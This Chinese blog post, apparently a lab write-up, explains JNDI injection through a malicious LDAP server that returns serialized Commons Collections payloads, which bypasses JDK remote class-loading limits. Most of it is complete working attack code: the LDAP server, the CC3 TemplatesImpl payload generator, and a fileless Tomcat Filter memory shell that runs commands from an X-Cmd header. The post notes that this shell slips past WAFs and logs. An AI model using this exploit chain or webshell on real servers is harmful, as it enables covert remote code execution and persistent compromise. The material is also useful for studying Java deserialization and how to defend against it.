---
title: 原理分析 | JNDI反序列化注入内存马 —— 内存马补充
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/oQZFvAAISEIwNBgA7TipliAAIPJgALGwUH8qA~tplv-dy-vqe2-sr-v2_1920_1259_q80.jpg
categories:
  - 代码审计
  - 内存马
tags:
  - JNDI
  - 反序列化
  - CC3
  - 内存马
  - LDAP
abbrlink: a7c3f9e2
date: 2026-04-25 17:26:00
---

# 原理分析 | JNDI反序列化注入内存马 —— 内存马补充

## 前言

前几篇文章里写了JNDI注入漏洞利用，用的是JNDI+Reference远程类加载的方式去打RCE，但这种方式在高版本JDK下会被默认禁用，实战里经常打不通。本篇来看另一种JNDI注入方式——利用LDAP配合反序列化链，绕过`trustURLCodebase`的限制，最后再把反序列化payload换成内存马注入，完成一条完整的无文件落地攻击链。

---

## 目录

- [两种JNDI注入方式对比](#两种jndi注入方式对比)
- [反序列化链方式原理分析](#反序列化链方式原理分析)
  - [LDAP Entry中的序列化数据](#ldap-entry中的序列化数据)
  - [触发点：DirectoryManager源码追踪](#触发点directorymanager源码追踪)
- [环境搭建与漏洞复现](#环境搭建与漏洞复现)
  - [搭建恶意LDAP服务](#搭建恶意ldap服务)
  - [触发验证](#触发验证)
- [联动内存马注入](#联动内存马注入)
  - [攻击链设计思路](#攻击链设计思路)
  - [获取StandardContext的几种方式](#获取standardcontext的几种方式)
  - [CmdFilter内存马](#cmdfilter内存马)
  - [TemplatesImpl加载内存马字节码](#templatesimpl加载内存马字节码)
  - [完整打法演示](#完整打法演示)
- [总结](#总结)

---

## 两种JNDI注入方式对比

在学FastJSON那几篇的时候，打RCE用的思路是：让目标服务器去lookup我们控制的LDAP/RMI地址，服务端返回一个Reference对象，里面带着远程类的URL，目标JVM通过URLClassLoader去拉取并加载这个类，执行其中的恶意代码。

但这条路在高版本JDK里走不通：

| 协议 | 限制版本   | 限制参数                                          |
| ---- | ---------- | ------------------------------------------------- |
| RMI  | JDK 8u121+ | `com.sun.jndi.rmi.object.trustURLCodebase=false`  |
| LDAP | JDK 8u191+ | `com.sun.jndi.ldap.object.trustURLCodebase=false` |

这两个参数默认关闭之后，JVM直接拒绝加载远程codebase，方式一就废了。

---

先放一张两种方式的总览图：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423090125713.png)

---

**方式一（远程类加载）：RMI 和 LDAP 都可以**

两个协议都支持返回 Reference 对象，触发远程类加载：

- **RMI**：Registry 返回 `ReferenceWrapper`，客户端通过 codebase URL 用 URLClassLoader 拉类
- **LDAP**：Entry 里带 `javaFactory` + `javaCodeBase` 属性，同样触发远程加载

限制也各自独立，RMI 被 8u121 封，LDAP 被 8u191 封。

---

**方式二（反序列化链）：LDAP 可以，RMI 也可以但路子不同**

- **LDAP**（主流）：Entry 里塞 `javaSerializedData`，客户端 `readObject()` 触发，这是高版本 JDK 绕过的标准打法。

- **RMI**（但机制不一样）：RMI 协议本身就是基于 Java 序列化传输的，有两条路：

  - 一：marshalsec 起恶意 RMI 服务端，目标连上来反序列化响应触发 RCE。因为 RMI 的结构和 LDAP 不一样，这种方式比较复杂，一般还是用 LDAP 的。

  - 二：先把 JRMPClient 链打入目标，目标反序列化后主动回连 JRMP Listener，Listener 吐真正 payload 触发 RCE。这种有些 CMS 就能打，比如 WebLogic 和 Shiro 之类的。
    - 实际案例：
      - **WebLogic**：`CVE-2017-3248` / `CVE-2018-2628` 等，利用 JRMP 回链。
      - **Shiro**：存在 Commons Beanutils 链时，可配合 JRMP 绕过某些限制。

---

**小结一下这几种方式的关系：**

| 能力 | LDAP | RMI |
|------|------|-----|
| 远程类加载（Reference） | ✅ | ✅ |
| 反序列化利用 | ✅（主流） | ✅（复杂） |
| JRMPClient 回连攻击 | ❌ | ✅（独有） |

**RMI 独有的 JRMPClient 回连攻击**，典型场景是目标在内网、RMI 端口 1099 你访问不到，但目标能出网。直接打 RMI 端口打不通，就用这种反向回连：

```
你发 JRMPClient 链 → 目标主动出网连你的 JRMPListener → 你下发 gadget → 二次反序列化 → RCE
```

**WebLogic + Shiro 这类场景很典型**，后面有机会再单独写写。

---

方式二针对高版本 JDK 的绕过思路：LDAP 服务端不返回 Reference，而是直接在 Entry 里塞一个序列化好的 Java 对象（放在`javaSerializedData`属性里）。客户端在处理 LDAP 响应的时候，会对这个序列化数据调用`readObject()`，如果目标服务器 classpath 里有可用的反序列化链（比如 Commons Collections、Commons Beanutils），就可以直接触发 RCE。

这个方式不走远程类加载，所以`trustURLCodebase`管不到它。

---

## 反序列化链方式原理分析

### LDAP Entry中的序列化数据

LDAP 协议里，对象可以有一个特殊属性叫`javaSerializedData`，值是序列化后的 Java 对象的字节数组。正常的业务场景是用来在目录服务里存 Java 对象用的，但在 JNDI 注入里就变成了传输反序列化 payload 的载体。

LDAP Entry 大概长这样（简化表示）：

```
dn: cn=exploit,dc=example,dc=com
objectClass: javaObject
objectClass: javaSerializedObject
javaClassName: java.lang.Object
javaSerializedData: <CC链序列化字节>
```

对比一下远程加载模式的 Entry：

```
dn: cn=exploit,dc=example,dc=com
objectClass: top
objectClass: javaObject
objectClass: javaNamingReference
javaClassName: Exploit
javaFactory: Exploit
javaCodeBase: http://攻击者IP:8888/
```

| 属性        | 远程类加载                 | 反序列化             |
| ----------- | -------------------------- | -------------------- |
| objectClass | javaNamingReference        | javaSerializedObject |
| 核心属性    | javaFactory + javaCodeBase | javaSerializedData   |
| 内容        | 工厂类名 + 远程URL         | 序列化字节数组       |

客户端调用`context.lookup("ldap://attacker.com/exploit")`的时候，会收到这个 Entry 并解析里面的`javaSerializedData`。有`javaSerializedData`的话就走反序列化，不会再去执行远程下载了。

### 触发点：DirectoryManager源码追踪

在 JDK 源码里，`com.sun.jndi.ldap.Obj`类里的`decodeObject()`方法负责处理 LDAP 返回的对象：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423200803819.png)

> `JAVA_ATTRIBUTES` 里的数据就是 Entry 的字段映射

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423200849738.png)

```
JAVA_ATTRIBUTES[0] = "objectClass"
JAVA_ATTRIBUTES[1] = "javaSerializedData"
JAVA_ATTRIBUTES[2] = "javaClassName"
JAVA_ATTRIBUTES[3] = "javaFactory"
JAVA_ATTRIBUTES[4] = "javaCodeBase"
JAVA_ATTRIBUTES[5] = "javaReferenceAddress"
JAVA_ATTRIBUTES[6] = "javaClassNames"
JAVA_ATTRIBUTES[7] = "javaRemoteLocation"
```

判断逻辑是：

```
检查 javaSerializedData
  ├── 有 → deserializeObject() → 反序列化路线  ← 我们走这条
  ├── 没有，检查 javaRemoteObject
  │     └── 有 → decodeRmiObject() → RMI对象路线
  └── 没有，检查 objectClass 是否为 javaNamingReference
        ├── 是 → decodeReference() → 远程类加载路线
        └── 都不是 → return null
```

**优先级从高到低：反序列化 > RMI对象 > 远程类加载**，所以高版本 JDK 封掉远程类加载之后，反序列化那条路完全不受影响，因为走的是第一个分支，根本没走到`decodeReference()`。

发现`javaSerializedData`属性后，就会调用`deserializeObject()`，里面就是`ObjectInputStream.readObject()`，走标准 Java 反序列化流程，反序列化链在这里触发。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423213859508.png)

---

## 环境搭建与漏洞复现

还是用上次写的 JNDI 模拟注入的 web 页面：

```java
// 注解，将当前类标记为一个 Servlet，并指定其访问路径为 /vuln
@WebServlet("/vuln")
public class JNDIServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        // 请求 GET /vuln?url=xxx，则 url 的值为 xxx
        String url = req.getParameter("url");
        try {
            // 创建一个 JNDI 的 InitialContext 对象
            InitialContext ctx = new InitialContext();
            // 漏洞点：参数可控，触发 JNDI lookup
            ctx.lookup(url);
        } catch (Exception e) {
            resp.getWriter().println("error: " + e.getMessage());
        }
    }
}
```

值得注意的是，远程类加载触发 和 反序列化链触发 的 URL 是一模一样的：

```
GET /vuln?url=ldap://攻击者IP:1389/exploit
```

区别在于攻击者 LDAP 服务返回的 Entry 内容不同，一个返回`javaFactory`，一个返回`javaSerializedData`，客户端自动走不同分支。

因为需要利用反序列化，所以添加一个 CC3.1 的依赖：

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

### 搭建恶意LDAP服务

这里自己写一个简单的 LDAP 服务（也可以用工具，这里写一下代码学习一下）。

如果自己搭 LDAP 服务并想手动塞入 payload，需要先生成序列化数据。以 CC6 链为例，可以用 ysoserial 生成：

```bash
java -jar ysoserial.jar CommonsCollections6 "calc.exe" > payload.ser
# 或者其他方法
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423224846086.png)

生成的`payload.ser`就是要塞进 LDAP Entry `javaSerializedData`属性里的字节数据。

自己写 LDAP 服务可以基于`UnboundID LDAP SDK`，pom.xml 添加依赖：

```xml
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>6.0.11</version>
</dependency>
```

代码大概是这样：

```java
import com.unboundid.ldap.listener.*;
import com.unboundid.ldap.listener.interceptor.*;
import com.unboundid.ldap.sdk.*;

public class MaliciousLDAPServer {
    // idea 直接运行
    public static void main(String[] args) throws Exception {
        // 从本地加载预先生成好的 CC6 反序列化 payload.ser
        byte[] payload = Files.readAllBytes(Paths.get("payload.ser"));

        // 用 UnboundID 库在本地起一个轻量级 LDAP Server，监听 1389 端口
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig("listen", null, 1389, null, null, null));

        config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
            @Override
            public void processSearchResult(InMemoryInterceptedSearchResult result) {
                try {
                    // 核心拦截器 — 构造恶意 Entry
                    Entry entry = new Entry("cn=exploit,dc=example,dc=com");
                    entry.addAttribute("javaClassName", "java.lang.String");
                    // 塞入序列化数据
                    entry.addAttribute("javaSerializedData", payload);
                    result.sendSearchEntry(entry);
                    result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        ds.startListening();
        System.out.println("[*] LDAP Server started on port 1389");
    }
}
```

### 触发验证

先启动 Tomcat 服务：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260424121627611.png)

然后启动自己写的 LDAP 服务：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260424121727961.png)

访问 LDAP 触发漏洞：

```
http://localhost:8080//vuln?url=ldap://127.0.0.1:1389/exploit
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260424121539679.png)

成功弹出计算器。

再梳理一遍过程：服务器的漏洞点请求我们自己写的 LDAP 服务，返回的 Entry 里包含`javaSerializedData`数据，服务器找到这个之后就不会再去找远程的`javaCodeBase`和`javaFactory`了，直接反序列化`javaSerializedData`里的数据，也就是我们传入的 CC6 链的 payload.ser，由于这个 CC6 链是用工具生成，直接用了 calc 的命令。

和之前的打法不同的是，这次不需要在远程服务器上放一个恶意类文件了，payload 完全在序列化字节里，更隐蔽。

---

## 联动内存马注入

弹计算器只是验证能打通，虽然已经可以利用反序列化 RCE 了，但实战里注入内存马可以实现更隐蔽的维权。思路是把 CC 链的执行命令部分替换成内存马注入代码。

### 攻击链设计思路

前面内存马系列写了 Filter/Servlet/Listener 内存马的注入原理，核心都是要在运行时动态修改`StandardContext`往里塞组件。思路是把注入内存马的代码打包成字节码，让反序列化链来加载执行。

**为什么走 TemplatesImpl？** 因为 CC 链本身的终点可以是命令执行（Runtime.exec），也可以是加载任意字节码（通过 TemplatesImpl），后者能执行任意 Java 代码，注入内存马用这个更合适。这个方法上篇 CC3 文章是有讲到过的。

整条攻击链长这样：

```
JNDI lookup → LDAP Server 返回 javaSerializedData
  → readObject() 触发反序列化
    → CC3 链 → TemplatesImpl._bytecodes
      → 加载 FilterInject.class（继承 AbstractTranslet）
        → static 块执行 → 注入 Filter 内存马
```

### 获取StandardContext的几种方式

注入内存马首先要拿到`StandardContext`，有好几种方式，这里都试了一下。

#### 方式一：Thread 获取 StandardContext（常用）

```
当前线程
  └─ ContextClassLoader (ParallelWebappClassLoader)
        └─ resources 字段 (StandardRoot)
              └─ context 字段 (StandardContext)  ← 目标
```

```java
// 获取类加载器并强转
ClassLoader cl = Thread.currentThread().getContextClassLoader();
ParallelWebappClassLoader pwcl = (ParallelWebappClassLoader) cl;
// 向上遍历父类，找到 resources 字段
Field resourcesField = getFieldFromHierarchy(pwcl.getClass(), "resources");
resourcesField.setAccessible(true);
Object resources = resourcesField.get(pwcl);
// 从 StandardRoot 中反射取出 context
StandardContext standardContext = extractContext(resources);

// 工具方法：向上遍历父类找字段
private static Field getFieldFromHierarchy(Class<?> clazz, String name) {
    // 如果 clazz 本身没有这个字段，就去父类里找，一直找到 Object 为止
    while (clazz != null) {
        try { return clazz.getDeclaredField(name); }
        catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); }
    }
    return null;
}

private static StandardContext extractContext(Object resources) throws Exception {
    if (resources instanceof StandardRoot) {
        // 从 StandardRoot 里取 context 字段，正是 StandardContext
        StandardRoot sr = (StandardRoot) resources;
        Field f = sr.getClass().getDeclaredField("context");
        f.setAccessible(true);
        Object ctx = f.get(sr);
        if (ctx instanceof StandardContext) return (StandardContext) ctx;
    }
    return null;
}
```

#### 方式二：JMX 获取 StandardContext（兜底方案）

除了通过 Thread 获取 StandardContext 的方式，还有通过 JMX 获取的方式，在有些地方能看到叫 `fromJMX`。反正方法很多，我也测试了一下，JMX 那条路好像需要开启特定的启动参数才行，就不深入了。下面贴一个三种方式都试的代码：

```java
// 主入口：尝试多种方法获取 StandardContext
private StandardContext getStandardContext() throws Exception {
    StandardContext ctx = null;
    // 方法1: JMX 标准查询
    ctx = getContextByJMX();
    if (ctx != null) {
        System.out.println(">>> Successfully obtained StandardContext via ** JMX **");
        return ctx;
    }
    // 方法2: 从当前 ClassLoader 反射获取
    ctx = getContextByClassLoader();
    if (ctx != null) {
        System.out.println(">>> Successfully obtained StandardContext via ** ClassLoader reflection **");
        return ctx;
    }
    // 方法3: 暴力遍历所有 MBean（兜底）
    ctx = getContextByMBeanServerDirect();
    if (ctx != null) {
        System.out.println(">>> Successfully obtained StandardContext via ** fallback MBean traversal **");
        return ctx;
    }

    System.err.println(">>> All three methods failed to obtain StandardContext.");
    return null;
}

// JMX 标准查询 (Tomcat 9)
private StandardContext getContextByJMX() throws Exception {
    MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
    ObjectName query = new ObjectName("Catalina:type=Context,*");
    Set<ObjectName> names = mbs.queryNames(query, null);
    for (ObjectName name : names) {
        String path = (String) mbs.getAttribute(name, "path");
        if (path == null || path.isEmpty()) continue;
        Object ctx = mbs.invoke(name, "findMappingObject", new Object[0], new String[0]);
        if (ctx instanceof StandardContext) {
            System.out.println("[JMX] Found StandardContext with path: " + path);
            return (StandardContext) ctx;
        }
    }
    System.out.println("[JMX] No StandardContext found");
    return null;
}

// 通过当前线程 ClassLoader 反射 resources->context
private StandardContext getContextByClassLoader() throws Exception {
    ClassLoader cl = Thread.currentThread().getContextClassLoader();
    if (!(cl instanceof ParallelWebappClassLoader)) {
        System.out.println("[ClassLoader] Not a ParallelWebappClassLoader: " + cl.getClass().getName());
        return null;
    }
    ParallelWebappClassLoader pwcl = (ParallelWebappClassLoader) cl;
    Method getResources = pwcl.getClass().getMethod("getResources");
    Object resources = getResources.invoke(pwcl);
    if (resources == null) {
        Field resField = getFieldFromHierarchy(pwcl.getClass(), "resources");
        if (resField != null) {
            resField.setAccessible(true);
            resources = resField.get(pwcl);
        }
    }
    if (resources == null) {
        System.out.println("[ClassLoader] Cannot obtain resources object");
        return null;
    }
    Field ctxField = getFieldFromHierarchy(resources.getClass(), "context");
    if (ctxField == null) return null;
    ctxField.setAccessible(true);
    Object ctx = ctxField.get(resources);
    if (ctx instanceof StandardContext) {
        System.out.println("[ClassLoader] Found StandardContext: " + ((StandardContext) ctx).getPath());
        return (StandardContext) ctx;
    }
    return null;
}

// 暴力遍历所有 MBean 属性（兜底）
private StandardContext getContextByMBeanServerDirect() throws Exception {
    MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
    Set<ObjectName> all = mbs.queryNames(null, null);
    for (ObjectName name : all) {
        try {
            if (name.toString().contains("type=Context") && mbs.isInstanceOf(name, "org.apache.catalina.core.StandardContext")) {
                Object instance = mbs.invoke(name, "findMappingObject", new Object[0], new String[0]);
                if (instance instanceof StandardContext) {
                    System.out.println("[Direct] Found StandardContext: " + ((StandardContext) instance).getPath());
                    return (StandardContext) instance;
                }
            }
        } catch (Exception ignored) {}
    }
    return null;
}
```

测试结果是第二种方式（ClassLoader 反射）成功了，第一种 JMX 方式没成功，好像需要开启 JMX 的一个启动参数，不管了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260424222852131.png)

测试结果没有问题，可以正常 RCE。

反正大概的思路就是这样，区别就是代码写法和版本环境问题了。

### CmdFilter内存马

以前的内存马都是非常简单的 URL 参数检测，这次换个方式玩玩——用请求头传命令，更隐蔽。

因为 CC6 是不包含 TemplatesImpl 的使用的，换个链，搭建的环境用的是 CC3.1 版本依赖，所以这次选择 CC3 链测试，之前也写过刚好拿来用。

首先先写一个 Filter：

```java
package com.vuln;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.util.Scanner;

public class CmdFilter implements Filter {
    @Override public void init(FilterConfig filterConfig) {}

    // 请求拦截逻辑
    @Override public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
            throws java.io.IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) resp;
        // 从请求头读取命令
        String cmd = request.getHeader("X-Cmd");
        // 判断是否是"木马请求"
        if (cmd != null && !cmd.isEmpty()) {
            // 设置响应编码
            response.setContentType("text/plain;charset=GBK");
            PrintWriter writer = response.getWriter();
            // 执行命令并写回
            writer.write(execCmd(cmd));
            writer.flush();
            // 直接返回，不放行到后续 Filter/Servlet
            return;
        }
        // 普通请求：透明放行，不影响业务
        chain.doFilter(request, response);
    }

    // 命令执行逻辑
    private String execCmd(String command) {
        StringBuilder sb = new StringBuilder();
        try {
            // 跨平台写法
            String os = System.getProperty("os.name").toLowerCase();
            String[] cmdArray = os.contains("win")
                    ? new String[]{"cmd.exe", "/c", command}
                    : new String[]{"/bin/bash", "-c", command};
            // ProcessBuilder 而非 Runtime.exec()，参数不走 shell 解析，避免空格截断
            Process p = new ProcessBuilder(cmdArray).start();

            // 同时读 stdout + stderr，命令报错时也能回显
            try (Scanner sc = new Scanner(p.getInputStream(), "GBK")) {
                while (sc.hasNextLine()) sb.append(sc.nextLine()).append("\r\n");
            }
            try (Scanner sc = new Scanner(p.getErrorStream(), "GBK")) {
                while (sc.hasNextLine()) sb.append(sc.nextLine()).append("\r\n");
            }
            p.waitFor();
        } catch (Exception e) {
            sb.append("Error: ").append(e.getMessage());
        }
        return sb.toString();
    }

    @Override public void destroy() {}
}
```

**触发方式**：只需在 HTTP 请求里带上 `X-Cmd` 头即可：

```http
GET /任意路径 HTTP/1.1
Host: localhost:8080
X-Cmd: whoami
```

**为什么用请求头而不是参数？**

- 请求头不会出现在 URL 里，WAF/日志不容易记录
- 不依赖具体的请求路径或参数名，隐蔽性更强

### TemplatesImpl加载内存马字节码

Filter 有了，需要写一个加载器，使用 Base64 + defineClass 的方式动态加载。

先写一个 class 文件转换 Base64 的工具类：

```java
package com.vuln;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

/**
 * 工具类：将 CmdFilter.class 文件转为 Base64 字符串
 */
public class ClassToBase64 {
    public static void main(String[] args) throws IOException {
        // 默认路径：target/classes/com/vuln/CmdFilter.class
        String classPath = "target/classes/com/vuln/CmdFilter.class";
        if (args.length > 0) {
            classPath = args[0];
        }
        byte[] bytes = Files.readAllBytes(Paths.get(classPath));
        String base64 = Base64.getEncoder().encodeToString(bytes);
        System.out.println(base64);
    }
}
```

获得 Base64 之后放入注册类里面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425134559268.png)

**注册类（注意这个注册类需要继承 `AbstractTranslet`）**，因为这个类是需要转换成字节传入 CC3 链中的`_bytecodes`的，而`_bytecodes`反序列化的要求就是需要继承`AbstractTranslet`：

```java
package com.vuln;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.ParallelWebappClassLoader;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.Filter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class FilterInject extends AbstractTranslet {  // ← 关键：继承这个

    static {
        // 把注入逻辑放 static 块，类加载时就执行，更可靠
        try {
            inject();
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    // AbstractTranslet 要求实现的两个抽象方法，空实现即可
    @Override
    public void transform(DOM dom, SerializationHandler[] handlers)
            throws TransletException {}

    @Override
    public void transform(DOM dom, DTMAxisIterator it, SerializationHandler handler)
            throws TransletException {}

    // 注册主方法
    private static void inject() throws Exception {
        // 获取 StandardContext
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        ParallelWebappClassLoader pwcl = (ParallelWebappClassLoader) cl;

        Field resourcesField = getFieldFromHierarchy(pwcl.getClass(), "resources");
        resourcesField.setAccessible(true);
        Object resources = resourcesField.get(pwcl);
        StandardContext standardContext = extractContext(resources);

        // Base64 解码还原 CmdFilter 字节码
        String b64 = "yv66vgAAADQArQoAKABgBwBhBwBiC......"; // CmdFilter 的 Base64
        byte[] classBytes = Base64.getDecoder().decode(b64);

        // 反射调用 defineClass 来实例化 evilFilter
        Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Class<?> filterClass = (Class<?>) defineClass.invoke(cl, classBytes, 0, classBytes.length);
        Filter evilFilter = (Filter) filterClass.getDeclaredConstructor().newInstance();

        // Filter 注册三步骤
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName("shell");
        filterDef.setFilter(evilFilter);
        filterDef.setFilterClass(evilFilter.getClass().getName());

        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName("shell");
        filterMap.addURLPattern("/*");

        standardContext.addFilterDef(filterDef);
        standardContext.addFilterMap(filterMap);
        // 代替 FilterConfig 的注册流程
        standardContext.filterStart();

        System.out.println("[+] Filter memory shell injected!");
    }

    // 配合上面的 StandardContext 获取的两个工具方法
    private static Field getFieldFromHierarchy(Class<?> clazz, String name) {
        while (clazz != null) {
            try { return clazz.getDeclaredField(name); }
            catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); }
        }
        return null;
    }

    private static StandardContext extractContext(Object resources) throws Exception {
        if (resources instanceof StandardRoot) {
            StandardRoot sr = (StandardRoot) resources;
            Field f = sr.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object ctx = f.get(sr);
            if (ctx instanceof StandardContext) return (StandardContext) ctx;
        }
        return null;
    }
}
```

### 完整打法演示

接下来把这个类写入 CC3 链中的`_bytecodes`里，可以写工具类，这里直接在 CC3 链里面读取 class 了，需要用 javac 编译一下或者直接用 IDEA 的 maven 编译：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425135407010.png)

编写 CC3 链顺便生成 ser 文件给 LDAP 服务用（这个 CC3 也是之前写过的然后照搬小改了一下）：

```java
package com.vuln;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3GeneratePayload {

    public static void main(String[] args) throws Exception {
        // ========== 请修改为你的 FilterInject.class 实际路径 ==========
        String classFilePath = "target/classes/com/vuln/FilterInject.class";
        // =============================================================

        // 1. 读取恶意类字节码（FilterInject 已内嵌 Base64 编码的 CmdFilter）
        byte[] bytecode = Files.readAllBytes(Paths.get(classFilePath));

        // 2. 构造 TemplatesImpl 并注入字节码
        TemplatesImpl templates = new TemplatesImpl();
        Field f1 = TemplatesImpl.class.getDeclaredField("_bytecodes");
        f1.setAccessible(true);
        f1.set(templates, new byte[][]{bytecode});

        Field f2 = TemplatesImpl.class.getDeclaredField("_name");
        f2.setAccessible(true);
        f2.set(templates, "FilterInject");

        // 显式设置 _tfactory 避免空指针（可选，但建议保留）
        Field f3 = TemplatesImpl.class.getDeclaredField("_tfactory");
        f3.setAccessible(true);
        f3.set(templates, new TransformerFactoryImpl());

        // 3. 构造 CC3 链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 4. 使用 TransformedMap 装饰（配合 AnnotationInvocationHandler）
        Map<String, Object> innerMap = new HashMap<>();
        innerMap.put("value", "dummy");
        Map transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

        // 5. 反射构造 AnnotationInvocationHandler
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        Object handler = construct.newInstance(java.lang.annotation.Retention.class, transformedMap);

        // 6. 序列化到文件 payload.ser
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.ser"))) {
            oos.writeObject(handler);
        }

        System.out.println("[+] Payload generated: payload.ser");
        System.out.println("[+] File size: " + new File("payload.ser").length() + " bytes");
    }
}
```

运行生成 ser 文件：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425135633276.png)

启动 LDAP 服务和 Tomcat：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425135711732.png)

访问：

```
http://localhost:8080//vuln?url=ldap://127.0.0.1:1389/exploit
```

控制台显示注入成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425135826613.png)

发送 RCE 请求：

```bash
curl -H "X-Cmd: whoami" http://localhost:8080/任意路径
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425140013055.png)

可以正常 RCE。

---

## 总结

两种 JNDI 注入方式各有适用场景：

**方式一（Reference 远程类加载）**打低版本 JDK 很方便，工具支持成熟，搭个 HTTP 服务器放恶意类就行，但高版本 JDK 直接死路一条。

**方式二（反序列化链）**是高版本 JDK 下的主流打法，前提是目标 classpath 里得有可利用的反序列化链，这在实际的 Java 应用里其实很常见（CC 系列、CB、Spring 等依赖用得非常普遍）。

**内存马联动**这块，思路和之前内存马系列是一脉相承的，关键是把注入逻辑打包成`AbstractTranslet`子类的字节码，借 TemplatesImpl 来执行，整条链完全在内存里跑，不写文件，查杀难度大。

整条链路走完之后，有几个要点值得记一下：

- 选择什么反序列化链取决于目标 classpath，CC6 不含 TemplatesImpl，CC3/CC2 才能走`_bytecodes`注入任意字节码
- `_tfactory`要显式设置，避免某些环境下空指针
- `FilterInject`继承`AbstractTranslet`是硬要求，TemplatesImpl 在反序列化`_bytecodes`时会校验父类
- 注入逻辑放`static`块比放构造方法更稳，类加载时就执行

---

> 参考：
>
> - [marshalsec 项目](https://github.com/mbechler/marshalsec)
> - JDK 源码 `com.sun.jndi.ldap.Obj#decodeObject`
> - 之前的内存马系列（Filter/Servlet/Listener 篇）
> - 之前的 CC2/CC3 链分析篇
